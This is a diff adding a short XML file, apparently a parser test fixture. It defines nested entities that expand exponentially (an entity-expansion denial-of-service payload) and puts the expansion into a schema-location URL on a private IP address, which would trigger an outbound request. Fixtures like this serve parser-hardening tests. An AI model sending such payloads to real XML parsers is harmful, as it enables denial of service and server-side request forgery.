@@ -1,0 +1,12 @@
+<?xml version='1.0'?>
+<!DOCTYPE data [
+<!ENTITY a "dos" >
+<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+]>
+<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
+    xsi:noNamespaceSchemaLocation="http://192.168.2.31/&d;"></data>
+
+
+
